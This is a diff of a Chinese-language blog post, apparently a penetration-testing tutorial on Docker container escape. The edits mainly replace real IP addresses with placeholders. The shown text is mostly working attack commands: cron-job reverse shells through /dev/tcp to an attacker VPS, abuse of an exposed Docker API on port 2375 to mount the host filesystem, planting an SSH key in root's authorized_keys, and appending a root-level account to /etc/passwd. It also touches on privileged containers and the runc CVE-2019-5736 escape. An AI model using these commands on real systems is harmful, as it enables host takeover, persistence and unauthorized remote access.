@@ -205,7 +205,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建一个目录：mkdir /test</span><br><span class="line">挂载磁盘到新建目录：mount /dev/sda1 /test</span><br><span class="line">切换根目录：chroot /test</span><br><span class="line">这一步很重要，不然会找不到test目录 ：exit</span><br><span class="line">看下是否获得了宿主机目录</span><br></pre></td></tr></table></figure>
 
 <p>写计划任务反弹shell,条件是宿主机到vps的网一定要通</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写计划任务，反弹宿主机Shell。</span><br><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.211.128.248/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写计划任务，反弹宿主机Shell。</span><br><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/vps/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
 
 <p>挂载ssh，需要挂载宿主机的root目录到容器，需要知道宿主机ip因为要连ssh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 run -it -v /root:/root ubuntu:18.04 /bin/bash</span><br><span class="line">mkdir /root/.ssh</span><br><span class="line">cat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys或者echo &quot;xxxx&quot;&gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">然后ssh 私钥登录。</span><br><span class="line">ssh -i /tmp/id_rsa root@xxxxx</span><br></pre></td></tr></table></figure>
@@ -218,7 +218,7 @@
 <p>docker -H tcp://192.168.32.128:2375 run -it -v /:/mnt 5deca9241f39 /bin/sh</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># openssl passwd -1 -salt kkkkkk 123456</span><br><span class="line">$1$kkkkkk$R913yPbJRwfO11aq9M3PM/</span><br><span class="line"># sed -i &#x27;$a kkkkkk:$1$kkkkkk$R913yPbJRwfO11aq9M3PM/:0:0:root:/root:/bin/sh&#x27; /mnt/etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p>ssh <a href="mailto:&#107;&#x6b;&#107;&#107;&#x6b;&#107;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x32;&#x2e;&#49;&#x32;&#56;">&#107;&#x6b;&#107;&#107;&#x6b;&#107;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x32;&#x2e;&#49;&#x32;&#56;</a></p>
+<p>ssh <a href="mailto:&#x6b;&#107;&#x6b;&#x6b;&#107;&#x6b;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#50;&#x2e;&#49;&#x32;&#x38;">&#x6b;&#107;&#x6b;&#x6b;&#107;&#x6b;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#51;&#50;&#x2e;&#49;&#x32;&#x38;</a></p>
 <p>如果存在shell的情况下，su kkkkkk，如果没有就ssh连接试试</p>
 <h2 id="特权容器"><a href="#特权容器" class="headerlink" title="特权容器"></a>特权容器</h2><p>攻击方式和上面一样，如果获取到一个shell是容器内的，查看容器是否有特权</p>
 <p>cat /proc/self/status | grep CapEff</p>
@@ -233,12 +233,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/test ubuntu:18.04 /bin/bash</span><br><span class="line">chroot test</span><br><span class="line">cd root/</span><br></pre></td></tr></table></figure>
 
 <p>写计划任务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  </span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/123 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  </span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.x.x/1234 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
 
 <h2 id="Docker容器挂载了宿主机根目录"><a href="#Docker容器挂载了宿主机根目录" class="headerlink" title="Docker容器挂载了宿主机根目录"></a>Docker容器挂载了宿主机根目录</h2><p>通过某种方式进入一个容器，看到某个目录可能是宿主机的根目录，比如</p>
 <p>docker run -it -v /:/test/ ubuntu:18.04</p>
 <p>在容器内，写计划任务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot test</span><br><span class="line">cd root/</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/123 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot test</span><br><span class="line">cd root/</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.x.x/1234 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
 
 <h2 id="Cgroup执行宿主机系统命令"><a href="#Cgroup执行宿主机系统命令" class="headerlink" title="Cgroup执行宿主机系统命令"></a>Cgroup执行宿主机系统命令</h2><p>….    </p>
 <h2 id="Runc容器逃逸CVE-2019-5736"><a href="#Runc容器逃逸CVE-2019-5736" class="headerlink" title="Runc容器逃逸CVE-2019-5736"></a>Runc容器逃逸CVE-2019-5736</h2><p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6         </p>
